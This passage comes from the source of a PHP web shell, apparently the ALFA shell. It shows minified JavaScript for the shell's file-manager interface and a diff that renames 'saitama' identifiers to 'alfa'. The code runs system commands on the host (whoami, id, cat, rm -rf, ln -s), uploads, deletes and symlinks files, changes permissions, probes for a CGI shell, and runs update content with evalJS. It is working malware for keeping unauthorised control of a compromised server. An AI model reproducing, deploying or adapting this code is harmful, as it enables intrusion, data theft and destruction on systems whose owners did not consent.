?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function alfaFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),alfaSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){alfaFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;alfaRightClickMenu(y,_),e.preventDefault()})})}function alfaFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=alfaGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span class="filesman-tab-folder-name">'+i+'</span> <img fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),alfa_fm_id=o,g("FilesMan",l),alfa_fm_id=0}function alfaFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function alfaFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function alfaPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+alfa_current_fm_id;alfaloader(o,"block"),data="a="+alfab64(e)+"&c="+alfab64(t)+"&alfa1="+alfab64(a)+"&alfa2="+alfab64(i)+"&alfa3="+alfab64(l)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,r,!1,o)}function alfaPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),alfaShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification("error...!","Rename Action","error");alfaloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){alfaloader(t,"none"),alfaShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,alfaShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification(t,"Modify Action","error");alfaloader(a,"none")})}}function alfaInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+alfab64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("alfa-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("alfa_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.alfa_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+alfab64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+alfab64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&alfaCheckUrlHash()},alfaCheckUrlHash(),alfagetFlags(),rightclick_menu_context=$("rightclick_menu").style,alfaInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);var e=document.createElement("script");e.src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.10.2/Sortable.min.js",e.id="sortable-plugin",e.onload=function(){alfaInitSoratableTab($("filesman_tabs_child")),alfaInitSoratableTab(d.querySelector(".editor-tabs")),alfaInitSoratableTab(d.querySelector(".options_tab")),alfaInitSoratableTab(d.querySelector(".terminal-tabs")),alfaInitSoratableTab(d.querySelector(".sql-tabs"))},d.body.appendChild(e)}();
 </script>
 </body>
 </html>
@@ -2399,13 +2400,13 @@ if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'),
 function posix_getpwuid($p) {return false;} }
 if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
 function posix_getgrgid($p) {return false;} }
-function saitamaWhich($p) {
-$path = saitamaEx('which ' . $p,false,false);
+function alfaWhich($p) {
+$path = alfaEx('which ' . $p,false,false);
 if(!empty($path))
 return strlen($path);
 return false;
 }
-function saitamaSize($s) {
+function alfaSize($s) {
 if($s >= 1073741824)
 return sprintf('%1.2f', $s / 1073741824 ). ' GB';
 elseif($s >= 1048576)
@@ -2415,7 +2416,7 @@ return sprintf('%1.2f', $s / 1024 ) . ' KB';
 else
 return $s . ' B';
 }
-function saitamaPerms($p) {
+function alfaPerms($p) {
 if (($p & 0xC000) == 0xC000)$i = 's​';
 elseif (($p & 0xA000) == 0xA000)$i = 'l​';
 elseif (($p & 0x8000) == 0x8000)$i = '-​';
@@ -2435,7 +2436,7 @@ $i .= (($p & 0x0002) ? 'w​' : '-');
 $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't​' : 'x​' ) : (($p & 0x0200) ? 'T​' : '-'));
 return $i;
 }
-function saitamaPermsColor($f,$isbash=false){
+function alfaPermsColor($f,$isbash=false){
 $class = "";
 $num = "";
 $human = "";
@@ -2445,7 +2446,7 @@ $num = $f["num"];
 $human = $f["human"];
 }else{
 $num = substr(sprintf('%o', @fileperms($f)),-4);
-$human = saitamaPerms(@fileperms($f));
+$human = alfaPerms(@fileperms($f));
 if(!@is_readable($f))
 $class = "main_red_perm";
 elseif (!@is_writable($f))
@@ -2474,39 +2475,39 @@ $file_ary[$i][$key] = $file_post[$key][$i];
 }
 return $file_ary;
 }
-function _saitama_can_runCommand($cgi=true,$cache=true){
-	if(isset($_COOKIE["saitama_canruncmd"])&&$cache){
+function _alfa_can_runCommand($cgi=true,$cache=true){
+	if(isset($_COOKIE["alfa_canruncmd"])&&$cache){
 		return true;
 	}
-	if(strlen(saitamaEx("whoami",false,$cgi))>0){
-		$_COOKIE["saitama_canruncmd"] = true;
+	if(strlen(alfaEx("whoami",false,$cgi))>0){
+		$_COOKIE["alfa_canruncmd"] = true;
 		return true;
 	}
 	return false;
 }
-function _saitama_symlink($target, $link){
+function _alfa_symlink($target, $link){
 	$phpsym = function_exists("symlink");
 	if($phpsym){
 		@symlink($target, $link);
 	}else{
-		saitamaEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
+		alfaEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
 	}
 }
-function _saitama_file_exists($file,$cgi=true){
+function _alfa_file_exists($file,$cgi=true){
 	if(@file_exists($file)){
 		return true;
 	}else{
-		if(strlen(saitamaEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
+		if(strlen(alfaEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
 			return true;
 		}
 	}
 	return false;
 }
-function _saitama_file($file,$cgi=true){
+function _alfa_file($file,$cgi=true){
 	$array = @file($file);
 	if(!$array){
-		if(strlen(saitamaEx("id",false,$cgi))>0){
-			$data = saitamaEx('cat "'.addslashes($file).'"',false,$cgi);
+		if(strlen(alfaEx("id",false,$cgi))>0){
+			$data = alfaEx('cat "'.addslashes($file).'"',false,$cgi);
 			if(strlen($data)>0){
 				return explode("\n", $data);
 			}else{
@@ -2519,12 +2520,12 @@ function _saitama_file($file,$cgi=true){
 		return $array;
 	}
 }
-function _saitama_is_writable($file){
+function _alfa_is_writable($file){
 	$check = false;
 	$check = @is_writable($file);
 	if(!$check){
-		if(_saitama_can_runCommand()){
-			$check = saitamaEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
+		if(_alfa_can_runCommand()){
+			$check = alfaEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
 			if($check == "yes"){
 				$check = true;
 			}else{
@@ -2534,15 +2535,15 @@ function _saitama_is_writable($file){
 	}
 	return $check;
 }
-function _saitama_is_dir($dir,$mode="-d"){
+function _alfa_is_dir($dir,$mode="-d"){
 	$check = false;
 	$check = @is_dir($dir);
 	if($mode == "-e"){
 		$check = @is_file($dir);
 	}
 	if(!$check){
-		if(_saitama_can_runCommand()){
-			$check = saitamaEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
+		if(_alfa_can_runCommand()){
+			$check = alfaEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
 			if($check == "yes"){
 				return true;
 			}else{
@@ -2552,14 +2553,14 @@ function _saitama_is_dir($dir,$mode="-d"){
 	}
 	return $check;
 }
-function _saitama_load_ace_options($base){
-	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$base.'" onChange="saitamaAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$base.'" onChange="saitamaAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="saitamaAceChangeWrapMode(this,\''.$base.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="saitamaAceChangeFontSize(\''.$base.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="saitamaAceChangeFontSize(\''.$base.'\', \'-\', this);return false;">-</button> | ';
+function _alfa_load_ace_options($base){
+	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="alfaAceChangeWrapMode(this,\''.$base.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="alfaAceChangeFontSize(\''.$base.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="alfaAceChangeFontSize(\''.$base.'\', \'-\', this);return false;">-</button> | ';
 }
-function saitamaFilesMan2(){
-	saitamahead();
-	saitamaNum(8,9,10,7,6,5,4);
+function alfaFilesMan2(){
+	alfahead();
+	AlfaNum(8,9,10,7,6,5,4);
 	echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
-	saitamaFooter();
+	alfaFooter();
 }
 function copy_paste($c,$s,$d){
 if(@is_dir($c.$s)){
@@ -2571,24 +2572,24 @@ copy_paste($c.$s.'/',$f, $d.$s.'/');
 } elseif(is_file($c.$s))
 @copy($c.$s, $d.$s);
 }
-function saitamaFilesMan(){
-if(!empty ($_COOKIE['saitama_f']))
-$_COOKIE['saitama_f'] = @unserialize($_COOKIE['saitama_f']);
-if(!empty($_POST['saitama1'])){
-switch($_POST['saitama1']){
+function alfaFilesMan(){
+if(!empty ($_COOKIE['alfa_f']))
+$_COOKIE['alfa_f'] = @unserialize($_COOKIE['alfa_f']);
+if(!empty($_POST['alfa1'])){
+switch($_POST['alfa1']){
 case 'uploadFile':
 $move_cmd_file = false;
-$saitama_canruncmd = false;
+$alfa_canruncmd = false;
 if($GLOBALS['glob_chdir_false']){
-	$saitama_canruncmd = _saitama_can_runCommand(true,true);
+	$alfa_canruncmd = _alfa_can_runCommand(true,true);
 	$move_cmd_file = true;
 }
-if(_saitama_is_writable($GLOBALS['cwd'])){
+if(_alfa_is_writable($GLOBALS['cwd'])){
 $files = reArrayFiles($_FILES['f']);
 $ret_files = array();
 foreach($files as $file){
-if($move_cmd_file&&$saitama_canruncmd){
-	saitamaEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
+if($move_cmd_file&&$alfa_canruncmd){
+	alfaEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
 }else{
 	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
 		$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($file['name'])):array("name" => "????");
@@ -2596,9 +2597,9 @@ if($move_cmd_file&&$saitama_canruncmd){
 		$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($file['name']):"????");
 		$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($file['name']):"????");
 		$file_modify = @date('Y-m-d H:i:s', @filemtime($file['name']));
-		$file_perm = saitamaPermsColor($file['name']);
+		$file_perm = alfaPermsColor($file['name']);
 		$file_size = @filesize($file['name']);
-		$ret_files[] = array("name" => $file['name'], "size" => saitamaSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
+		$ret_files[] = array("name" => $file['name'], "size" => alfaSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
 	}
 }
 }
@@ -2616,33 +2617,33 @@ break;
 case 'mkdir':
 $new_dir_cmd = false;
 if($GLOBALS['glob_chdir_false']){
-	if(_saitama_can_runCommand(true,true)){
-		if(_saitama_is_writable($GLOBALS['cwd'])){
-			if(!_saitama_is_dir(trim($_POST['saitama2']))){
-				saitamaEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['saitama2']))."'");
-				echo "<script>saitamaShowNotification('".addslashes($_POST['saitama2'])." created...', 'Files manager');</script>";
+	if(_alfa_can_runCommand(true,true)){
+		if(_alfa_is_writable($GLOBALS['cwd'])){
+			if(!_alfa_is_dir(trim($_POST['alfa2']))){
+				alfaEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['alfa2']))."'");
+				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
 			}else{
-				echo "<script>saitamaShowNotification('folder already existed', 'Files manager', 'error');</script>";
+				echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";
 			}
 		}else{
-			echo "<script>saitamaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
+			echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
 		}
 	}else{
-		echo "<script>saitamaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
+		echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
 	}
 }else{
-	if(_saitama_is_writable($GLOBALS['cwd'])){
-		if(!_saitama_is_dir(trim($_POST['saitama2']))){
-			if(!@mkdir(trim($_POST['saitama2']))){
-				echo "<script>saitamaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
+	if(_alfa_is_writable($GLOBALS['cwd'])){
+		if(!_alfa_is_dir(trim($_POST['alfa2']))){
+			if(!@mkdir(trim($_POST['alfa2']))){
+				echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
 			}else{
-				echo "<script>saitamaShowNotification('".addslashes($_POST['saitama2'])." created...', 'Files manager');</script>";
+				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
 			}
 		}else{
-			echo "<script>saitamaShowNotification('folder already existed', 'Files manager', 'error');</script>";
+			echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";
 		}
 	}else{
-		echo "<script>saitamaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
+		echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
 	}
 }
 break;
@@ -2669,28 +2670,28 @@ if($f == '..')
 continue;
 $f = rawurldecode($f);
 if($GLOBALS["glob_chdir_false"]){
-	if(_saitama_can_runCommand(true,true)){
-		saitamaEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
+	if(_alfa_can_runCommand(true,true)){
+		alfaEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
 	}
 }else{
-saitamaEx("rm -rf '".addslashes($f)."'",false,false);
+alfaEx("rm -rf '".addslashes($f)."'",false,false);
 if(@is_dir($f))
 deleteDir($f);
 else
 @unlink($f);
 }
 }
-if(@is_dir(rawurldecode(@$_POST['saitama2']))&&rawurldecode(@$_POST['saitama2'])!='..'){
-deleteDir(rawurldecode(@$_POST['saitama2']));
-saitamaEx("rm -rf '".addslashes($_POST['saitama2'])."'",false,false);
+if(@is_dir(rawurldecode(@$_POST['alfa2']))&&rawurldecode(@$_POST['alfa2'])!='..'){
+deleteDir(rawurldecode(@$_POST['alfa2']));
+alfaEx("rm -rf '".addslashes($_POST['alfa2'])."'",false,false);
 }else{
-@unlink(rawurldecode(@$_POST['saitama2']));
+@unlink(rawurldecode(@$_POST['alfa2']));
 }
 if($GLOBALS["glob_chdir_false"]){
-	$source = rawurldecode(@$_POST['saitama2']);
+	$source = rawurldecode(@$_POST['alfa2']);
 	if($source!='..'&&!empty($source)){
-		if(_saitama_can_runCommand(true,true)){
-			saitamaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
+		if(_alfa_can_runCommand(true,true)){
+			alfaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
 		}
 	}
 }
@@ -2698,10 +2699,10 @@ if(is_array($_POST['f']))
 return;
 break;
 case 'paste':
-if($_COOKIE['saitama_act'] == 'copy'&&isset($_COOKIE['saitama_f'])){
-foreach($_COOKIE['saitama_f'] as $f)
-copy_paste($_COOKIE['saitama_c'],$f, $GLOBALS['cwd']);
-}elseif($_COOKIE['saitama_act'] == 'move'&&isset($_COOKIE['saitama_f'])){
+if($_COOKIE['alfa_act'] == 'copy'&&isset($_COOKIE['alfa_f'])){
+foreach($_COOKIE['alfa_f'] as $f)
+copy_paste($_COOKIE['alfa_c'],$f, $GLOBALS['cwd']);
+}elseif($_COOKIE['alfa_act'] == 'move'&&isset($_COOKIE['alfa_f'])){
 function move_paste($c,$s,$d){
 if(@is_dir($c.$s)){
 @mkdir($d.$s);
@@ -2712,19 +2713,19 @@ copy_paste($c.$s.'/',$f, $d.$s.'/');
 }elseif(@is_file($c.$s))
 @copy($c.$s, $d.$s);
 }
-foreach($_COOKIE['saitama_f'] as $f)
-@rename($_COOKIE['saitama_c'].$f, $GLOBALS['cwd'].$f);
-}elseif($_COOKIE['saitama_act'] == 'zip'&&isset($_COOKIE['saitama_f'])){
+foreach($_COOKIE['alfa_f'] as $f)
+@rename($_COOKIE['alfa_c'].$f, $GLOBALS['cwd'].$f);
+}elseif($_COOKIE['alfa_act'] == 'zip'&&isset($_COOKIE['alfa_f'])){
 if(class_exists('ZipArchive')){
 $zip = new ZipArchive();
-$zipX = "saitama_".rand(1,1000).".zip";
